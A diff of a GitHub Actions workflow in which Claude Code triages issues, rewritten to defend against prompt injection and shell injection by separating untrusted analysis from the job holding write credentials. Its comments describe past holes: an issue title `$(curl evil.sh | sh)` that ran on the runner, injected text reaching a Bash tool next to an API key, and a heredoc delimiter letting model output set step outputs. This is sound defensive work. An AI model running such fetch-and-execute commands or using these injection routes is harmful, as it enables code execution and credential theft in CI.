@@ -12,20 +12,49 @@ on:
         required: true
         type: number
 
-permissions:
-  issues: write
-  contents: read
+# Deny by default; each job grants only the scopes it needs.
+permissions: {}
+
+concurrency:
+  group: issue-triage-${{ github.event.issue.number || inputs.issue_number }}
+  cancel-in-progress: false
+
+# WHY THIS FILE IS SPLIT INTO TWO JOBS
+#
+# This repository is PUBLIC and triage must answer strangers, so gating on
+# author_association is not available here: restricting to
+# OWNER/MEMBER/COLLABORATOR would mean the bot never triages a new user's
+# issue, which is the whole job.
+#
+# Since the people cannot be filtered, the CREDENTIALS are separated instead:
+#
+#   analyze  handles attacker-controlled text, holds NO write credential.
+#   respond  holds the App token, never reads issue text and runs no model.
+#
+# The worst a successful prompt injection achieves in `analyze` is a bad
+# result.json, which `respond` validates against an allowlist before acting.
 
 jobs:
-  triage:
+  # ---------------------------------------------------------------------------
+  # JOB 1 - analyze. Untrusted input, read-only credentials.
+  # ---------------------------------------------------------------------------
+  analyze:
     runs-on: ubuntu-latest
-    # Skip if comment is from the bot itself (dingo-reviewer app)
+    # Never loop on our own bot's comments.
     if: github.event_name != 'issue_comment' || github.event.comment.user.login != 'dingo-reviewer[bot]'
+    permissions:
+      contents: read
+      issues: read
+    outputs:
+      type: ${{ steps.trigger.outputs.type }}
+      issue_number: ${{ steps.trigger.outputs.issue_number }}
+      analyzed: ${{ steps.run_claude.outputs.analyzed }}
     steps:
+      # No `ref:` on purpose. `issues` and `issue_comment` resolve to the DEFAULT
+      # BRANCH, so this checks out our own trusted tree. Never point this at a
+      # contributor ref: this job runs for everyone.
       - name: Checkout repository
         uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
 
       - name: Setup Node.js
         uses: actions/setup-node@v4
@@ -35,221 +64,243 @@ jobs:
       - name: Install Claude Code
         run: npm install -g @anthropic-ai/claude-code@latest
 
-      - name: Generate Dingo Reviewer token
-        id: dingo-bot
-        uses: tibdex/github-app-token@v2
-        with:
-          app_id: ${{ secrets.DINGO_BOT_APP_ID }}
-          private_key: ${{ secrets.DINGO_BOT_PRIVATE_KEY }}
-
       - name: Determine trigger type
         id: trigger
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          EVENT_ISSUE_NUMBER: ${{ github.event.issue.number }}
+          INPUT_ISSUE_NUMBER: ${{ inputs.issue_number }}
         run: |
-          if [ "${{ github.event_name }}" = "issue_comment" ]; then
-            echo "type=comment" >> $GITHUB_OUTPUT
-            echo "issue_number=${{ github.event.issue.number }}" >> $GITHUB_OUTPUT
-          elif [ -n "${{ github.event.issue.number }}" ]; then
-            echo "type=new_issue" >> $GITHUB_OUTPUT
-            echo "issue_number=${{ github.event.issue.number }}" >> $GITHUB_OUTPUT
+          set -euo pipefail
+          if [ "$EVENT_NAME" = "issue_comment" ]; then
+            TYPE=comment
+            NUM="$EVENT_ISSUE_NUMBER"
+          elif [ -n "$EVENT_ISSUE_NUMBER" ]; then
+            TYPE=new_issue
+            NUM="$EVENT_ISSUE_NUMBER"
           else
-            echo "type=manual" >> $GITHUB_OUTPUT
-            echo "issue_number=${{ inputs.issue_number }}" >> $GITHUB_OUTPUT
+            TYPE=manual
+            NUM="$INPUT_ISSUE_NUMBER"
           fi
+          # Digits only: this value is concatenated into a gh api path below.
+          case "$NUM" in
+            ''|*[!0-9]*) echo "::error::invalid issue number"; exit 1 ;;
+          esac
+          echo "type=$TYPE" >> "$GITHUB_OUTPUT"
+          echo "issue_number=$NUM" >> "$GITHUB_OUTPUT"
 
-      - name: Get issue details
+      # The issue title and author are deliberately NOT written to $GITHUB_OUTPUT.
+      # Laundering untrusted text through a step output is what hid the previous
+      # injection from actionlint: its `expression` rule tracks the
+      # github.event.* contexts, and goes quiet once the value is a step output.
+      - name: Fetch issue and comments
         id: issue
         env:
-          GH_TOKEN: ${{ steps.dingo-bot.outputs.token }}
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+          ISSUE_NUM: ${{ steps.trigger.outputs.issue_number }}
         run: |
+          set -euo pipefail
           mkdir -p .triage
-          ISSUE_NUM="${{ steps.trigger.outputs.issue_number }}"
-          echo "number=$ISSUE_NUM" >> $GITHUB_OUTPUT
-
-          # Fetch issue details
-          gh api repos/${{ github.repository }}/issues/$ISSUE_NUM > .triage/issue_data.json
-          echo "title=$(jq -r '.title' .triage/issue_data.json)" >> $GITHUB_OUTPUT
-          echo "author=$(jq -r '.user.login' .triage/issue_data.json)" >> $GITHUB_OUTPUT
-
-          # Fetch all comments
-          gh api repos/${{ github.repository }}/issues/$ISSUE_NUM/comments > .triage/comments.json
-
-          # Check if bot has participated in this conversation
+          gh api "repos/$REPO/issues/$ISSUE_NUM" > .triage/issue_data.json
+          gh api "repos/$REPO/issues/$ISSUE_NUM/comments" > .triage/comments.json
           BOT_PARTICIPATED=$(jq '[.[] | select(.user.login == "dingo-reviewer[bot]")] | length > 0' .triage/comments.json)
-          echo "bot_participated=$BOT_PARTICIPATED" >> $GITHUB_OUTPUT
+          echo "bot_participated=$BOT_PARTICIPATED" >> "$GITHUB_OUTPUT"
 
+      # Built by jq straight from the JSON, so untrusted text never becomes a
+      # shell word. The previous version interpolated the title into an UNQUOTED
+      # heredoc, which executed it: a title of `$(curl evil.sh | sh)` ran on the
+      # runner, silently, before Claude was even invoked.
       - name: Write issue to file
-        if: steps.trigger.outputs.type == 'new_issue' || steps.trigger.outputs.type == 'manual'
+        if: steps.trigger.outputs.type != 'comment'
+        env:
+          ISSUE_NUM: ${{ steps.trigger.outputs.issue_number }}
         run: |
-          BODY=$(jq -r '.body // "No description provided"' .triage/issue_data.json)
-          cat > .triage/issue.md << ISSUE_EOF
-          # Issue #${{ steps.issue.outputs.number }}
-
-          **Title:** ${{ steps.issue.outputs.title }}
-
-          **Author:** @${{ steps.issue.outputs.author }}
-
-          **Body:**
-          $BODY
-          ISSUE_EOF
+          set -euo pipefail
+          jq -r --arg num "$ISSUE_NUM" '
+            "# Issue #\($num)", "",
+            "**Title:** \(.title)", "",
+            "**Author:** @\(.user.login)", "",
+            "**Body:**",
+            (.body // "No description provided")
+          ' .triage/issue_data.json > .triage/issue.md
 
       - name: Write conversation to file
         if: steps.trigger.outputs.type == 'comment'
+        env:
+          TRIGGER_LOGIN: ${{ github.event.comment.user.login }}
         run: |
-          # Build full conversation markdown
-          ISSUE_BODY=$(jq -r '.body // "No description provided"' .triage/issue_data.json)
-          ISSUE_AUTHOR=$(jq -r '.user.login' .triage/issue_data.json)
-
-          cat > .triage/conversation.md << 'CONV_HEADER'
-          # Issue Conversation
-
-          CONV_HEADER
-
-          echo "## Original Issue" >> .triage/conversation.md
-          echo "**Author:** @$ISSUE_AUTHOR" >> .triage/conversation.md
-          echo "**Title:** ${{ steps.issue.outputs.title }}" >> .triage/conversation.md
-          echo "" >> .triage/conversation.md
-          echo "$ISSUE_BODY" >> .triage/conversation.md
-          echo "" >> .triage/conversation.md
-          echo "---" >> .triage/conversation.md
-          echo "" >> .triage/conversation.md
-          echo "## Comments" >> .triage/conversation.md
-          echo "" >> .triage/conversation.md
-
-          # Add each comment
-          jq -r '.[] | "### @\(.user.login)\n\(.body)\n\n---\n"' .triage/comments.json >> .triage/conversation.md
-
-          echo "" >> .triage/conversation.md
-          echo "## Latest Comment (trigger)" >> .triage/conversation.md
-          echo "**From:** @${{ github.event.comment.user.login }}" >> .triage/conversation.md
-          echo "" >> .triage/conversation.md
+          set -euo pipefail
+          {
+            echo "# Issue Conversation"
+            echo
+            echo "## Original Issue"
+            jq -r '"**Author:** @\(.user.login)", "**Title:** \(.title)", "", (.body // "No description provided")' .triage/issue_data.json
+            echo
+            echo "---"
+            echo
+            echo "## Comments"
+            echo
+            jq -r '.[] | "### @\(.user.login)\n\(.body)\n\n---\n"' .triage/comments.json
+            echo
+            echo "## Latest Comment (trigger)"
+            printf '**From:** @%s\n' "$TRIGGER_LOGIN"
+          } > .triage/conversation.md
 
       - name: Skip comment if bot not in conversation
         id: should_process
         if: steps.trigger.outputs.type == 'comment'
+        env:
+          BOT_PARTICIPATED: ${{ steps.issue.outputs.bot_participated }}
         run: |
-          if [ "${{ steps.issue.outputs.bot_participated }}" = "false" ]; then
-            echo "skip=true" >> $GITHUB_OUTPUT
+          set -euo pipefail
+          if [ "$BOT_PARTICIPATED" = "false" ]; then
+            echo "skip=true" >> "$GITHUB_OUTPUT"
             echo "Bot has not participated in this conversation, skipping..."
           else
-            echo "skip=false" >> $GITHUB_OUTPUT
+            echo "skip=false" >> "$GITHUB_OUTPUT"
             echo "Bot previously commented, will analyze for reply..."
           fi
 
-      - name: Triage new issue with Claude Code
-        id: triage
-        if: steps.trigger.outputs.type == 'new_issue' || steps.trigger.outputs.type == 'manual'
+      # --dangerously-skip-permissions is GONE. It handed every issue author, via
+      # prompt injection, a Bash tool inside a process holding ANTHROPIC_API_KEY.
+      # --disallowedTools removes the tool from the session outright: the model
+      # reports it has no Bash tool, and the headless run still exits 0.
+      #
+      # The prompt goes on STDIN. --allowedTools and --disallowedTools are
+      # VARIADIC, so a positional prompt placed after them is parsed as further
+      # tool names. That fails SILENTLY in the dangerous direction: the bogus
+      # entries are only a warning ("Permission deny rule ... matches no known
+      # tool"), leaving the deny list empty.
+      - name: Analyze with Claude Code
+        id: run_claude
+        if: steps.trigger.outputs.type != 'comment' || steps.should_process.outputs.skip != 'true'
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          TRIGGER_TYPE: ${{ steps.trigger.outputs.type }}
         run: |
-          # Run Claude Code in print mode with Opus 4.5
-          claude --model opus -p --dangerously-skip-permissions \
-            --system-prompt "$(cat .github/prompts/issue-triage-system.md)" \
-            "Triage the GitHub issue in .triage/issue.md. Read it, explore the codebase for context, then write your triage result to .triage/result.json"
-
-          echo "Claude Code completed"
-
-          # Read the result file
-          if [ -f .triage/result.json ]; then
-            CLEAN_JSON=$(cat .triage/result.json)
+          set -euo pipefail
+          if [ "$TRIGGER_TYPE" = "comment" ]; then
+            SYSTEM_FILE=.github/prompts/issue-comment-system.md
+            TASK="Analyze the conversation in .triage/conversation.md. Decide if you should reply. Write result to .triage/result.json"
           else
-            echo "Error: result.json not created"
-            exit 1
+            SYSTEM_FILE=.github/prompts/issue-triage-system.md
+            TASK="Triage the GitHub issue in .triage/issue.md. Read it, explore the codebase for context, then write your triage result to .triage/result.json"
           fi
 
-          # Extract fields
-          echo "category=$(echo "$CLEAN_JSON" | jq -r '.category // "question"')" >> $GITHUB_OUTPUT
-          echo "labels=$(echo "$CLEAN_JSON" | jq -r '.labels | join(",")')" >> $GITHUB_OUTPUT
-          echo "priority=$(echo "$CLEAN_JSON" | jq -r '.priority // empty')" >> $GITHUB_OUTPUT
-          echo "assign_jack=$(echo "$CLEAN_JSON" | jq -r '.assign_to_jack // false')" >> $GITHUB_OUTPUT
-          echo "convert_discussion=$(echo "$CLEAN_JSON" | jq -r '.convert_to_discussion // false')" >> $GITHUB_OUTPUT
+          printf '%s' "$TASK" | claude --model opus -p \
+            --allowedTools "Read,Grep,Glob,Write" \
+            --disallowedTools "Bash,WebFetch,WebSearch,Task,NotebookEdit" \
+            --system-prompt "$(cat "$SYSTEM_FILE")"
 
-          RESPONSE_TEXT=$(echo "$CLEAN_JSON" | jq -r '.response // empty')
-          echo "response<<EOF" >> $GITHUB_OUTPUT
-          echo "$RESPONSE_TEXT" >> $GITHUB_OUTPUT
-          echo "EOF" >> $GITHUB_OUTPUT
-
-          # Show related files for debugging
-          echo "Related files:"
-          echo "$CLEAN_JSON" | jq -r '.related_files[]?' || true
-
-      - name: Reply to comment with Claude Code
-        id: reply
-        if: steps.trigger.outputs.type == 'comment' && steps.should_process.outputs.skip != 'true'
-        env:
-          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
-        run: |
-          # Run Claude Code to analyze conversation and decide if reply needed
-          claude --model opus -p --dangerously-skip-permissions \
-            --system-prompt "$(cat .github/prompts/issue-comment-system.md)" \
-            "Analyze the conversation in .triage/conversation.md. Decide if you should reply. Write result to .triage/result.json"
-
-          echo "Claude Code completed"
-
-          if [ -f .triage/result.json ]; then
-            CLEAN_JSON=$(cat .triage/result.json)
-          else
-            echo "Error: result.json not created"
+          if [ ! -f .triage/result.json ]; then
+            echo "::error::result.json not created"
             exit 1
           fi
+          jq -e . .triage/result.json > /dev/null || {
+            echo "::error::result.json is not valid JSON"
+            exit 1
+          }
+          echo "analyzed=true" >> "$GITHUB_OUTPUT"
 
-          # Extract fields
-          SHOULD_REPLY=$(echo "$CLEAN_JSON" | jq -r '.should_reply // false')
-          echo "should_reply=$SHOULD_REPLY" >> $GITHUB_OUTPUT
-
-          RESPONSE_TEXT=$(echo "$CLEAN_JSON" | jq -r '.response // empty')
-          echo "response<<EOF" >> $GITHUB_OUTPUT
-          echo "$RESPONSE_TEXT" >> $GITHUB_OUTPUT
-          echo "EOF" >> $GITHUB_OUTPUT
-
-          REASON=$(echo "$CLEAN_JSON" | jq -r '.reason // empty')
-          echo "Reason: $REASON"
-
-      - name: Add labels
-        if: steps.triage.outputs.labels != ''
-        env:
-          GH_TOKEN: ${{ steps.dingo-bot.outputs.token }}
-        run: |
-          IFS=',' read -ra LABEL_ARRAY <<< "${{ steps.triage.outputs.labels }}"
-          for label in "${LABEL_ARRAY[@]}"; do
-            # Only add if label exists
-            if gh label list | grep -q "^$label"; then
-              gh issue edit ${{ steps.issue.outputs.number }} --add-label "$label" || true
-            fi
-          done
-
-      - name: Assign to Jack
-        if: steps.triage.outputs.assign_jack == 'true'
-        env:
-          GH_TOKEN: ${{ steps.dingo-bot.outputs.token }}
-        run: |
-          gh issue edit ${{ steps.issue.outputs.number }} --add-assignee jackrudenko || true
-
-      - name: Post triage response
-        if: steps.triage.outputs.response != ''
-        env:
-          GH_TOKEN: ${{ steps.dingo-bot.outputs.token }}
-          RESPONSE_TEXT: ${{ steps.triage.outputs.response }}
-        run: |
-          echo "$RESPONSE_TEXT" > .triage/comment.md
-          gh issue comment ${{ steps.issue.outputs.number }} --body-file .triage/comment.md
-
-      - name: Post comment reply
-        if: steps.reply.outputs.should_reply == 'true' && steps.reply.outputs.response != ''
-        env:
-          GH_TOKEN: ${{ steps.dingo-bot.outputs.token }}
-          RESPONSE_TEXT: ${{ steps.reply.outputs.response }}
-        run: |
-          echo "$RESPONSE_TEXT" > .triage/comment.md
-          gh issue comment ${{ steps.issue.outputs.number }} --body-file .triage/comment.md
-
-      - name: Convert to discussion (if needed)
-        if: steps.triage.outputs.convert_discussion == 'true'
-        env:
-          GH_TOKEN: ${{ steps.dingo-bot.outputs.token }}
-        run: |
-          echo "Note: Issue marked for discussion conversion."
-          gh issue edit ${{ steps.issue.outputs.number }} --add-label "discussion" || true
+      - name: Upload analysis result
+        if: steps.run_claude.outputs.analyzed == 'true'
+        uses: actions/upload-artifact@v4
+        with:
+          name: triage-result
+          path: .triage/result.json
+          retention-days: 1
 
       - name: Cleanup
         if: always()
         run: rm -rf .triage
+
+  # ---------------------------------------------------------------------------
+  # JOB 2 - respond. Holds the App token, never sees the issue text.
+  # ---------------------------------------------------------------------------
+  respond:
+    needs: analyze
+    if: needs.analyze.outputs.analyzed == 'true'
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+    steps:
+      - name: Download analysis result
+        uses: actions/download-artifact@v5
+        with:
+          name: triage-result
+          path: .triage
+
+      - name: Validate result
+        id: result
+        env:
+          TRIGGER_TYPE: ${{ needs.analyze.outputs.type }}
+        run: |
+          set -euo pipefail
+          jq -e . .triage/result.json > /dev/null
+
+          # Labels are model output shaped by attacker text. Intersect with a
+          # fixed allowlist rather than trusting whatever came back.
+          ALLOWED='["P0-critical","P1-high","P2-medium","P3-low","bug","enhancement","question","discussion","duplicate","already-implemented","planned","good first issue","help wanted","documentation"]'
+          jq -r --argjson allowed "$ALLOWED" \
+            '[(.labels // [])[] | select(. as $l | $allowed | index($l))] | .[]' \
+            .triage/result.json > .triage/labels.txt
+
+          echo "assign_jack=$(jq -r 'if .assign_to_jack == true then "true" else "false" end' .triage/result.json)" >> "$GITHUB_OUTPUT"
+          echo "convert_discussion=$(jq -r 'if .convert_to_discussion == true then "true" else "false" end' .triage/result.json)" >> "$GITHUB_OUTPUT"
+
+          if [ "$TRIGGER_TYPE" = "comment" ]; then
+            POST=$(jq -r 'if (.should_reply == true) and ((.response // "") != "") then "true" else "false" end' .triage/result.json)
+          else
+            POST=$(jq -r 'if (.response // "") != "" then "true" else "false" end' .triage/result.json)
+          fi
+          echo "post=$POST" >> "$GITHUB_OUTPUT"
+
+          # The comment body goes to a FILE, never to $GITHUB_OUTPUT. The old
+          # heredoc used the literal delimiter EOF, so a model response
+          # containing a line "EOF" closed it and set arbitrary step outputs.
+          jq -r '.response // ""' .triage/result.json > .triage/comment.md
+
+      - name: Generate Dingo Reviewer token
+        id: dingo-bot
+        uses: tibdex/github-app-token@3beb63f4bd073e61482598c45c71c1019b59b73a # v2
+        with:
+          app_id: ${{ secrets.DINGO_BOT_APP_ID }}
+          private_key: ${{ secrets.DINGO_BOT_PRIVATE_KEY }}
+
+      - name: Add labels
+        env:
+          GH_TOKEN: ${{ steps.dingo-bot.outputs.token }}
+          REPO: ${{ github.repository }}
+          ISSUE_NUM: ${{ needs.analyze.outputs.issue_number }}
+        run: |
+          set -euo pipefail
+          [ -s .triage/labels.txt ] || exit 0
+          while IFS= read -r label; do
+            [ -n "$label" ] || continue
+            gh issue edit "$ISSUE_NUM" --repo "$REPO" --add-label "$label" || true
+          done < .triage/labels.txt
+
+      - name: Assign to Jack
+        if: steps.result.outputs.assign_jack == 'true'
+        env:
+          GH_TOKEN: ${{ steps.dingo-bot.outputs.token }}
+          REPO: ${{ github.repository }}
+          ISSUE_NUM: ${{ needs.analyze.outputs.issue_number }}
+        run: gh issue edit "$ISSUE_NUM" --repo "$REPO" --add-assignee jackrudenko || true
+
+      - name: Post response
+        if: steps.result.outputs.post == 'true'
+        env:
+          GH_TOKEN: ${{ steps.dingo-bot.outputs.token }}
+          REPO: ${{ github.repository }}
+          ISSUE_NUM: ${{ needs.analyze.outputs.issue_number }}
+        run: gh issue comment "$ISSUE_NUM" --repo "$REPO" --body-file .triage/comment.md
+
+      - name: Mark for discussion
+        if: steps.result.outputs.convert_discussion == 'true'
+        env:
+          GH_TOKEN: ${{ steps.dingo-bot.outputs.token }}
+          REPO: ${{ github.repository }}
+          ISSUE_NUM: ${{ needs.analyze.outputs.issue_number }}
+        run: gh issue edit "$ISSUE_NUM" --repo "$REPO" --add-label "discussion" || true
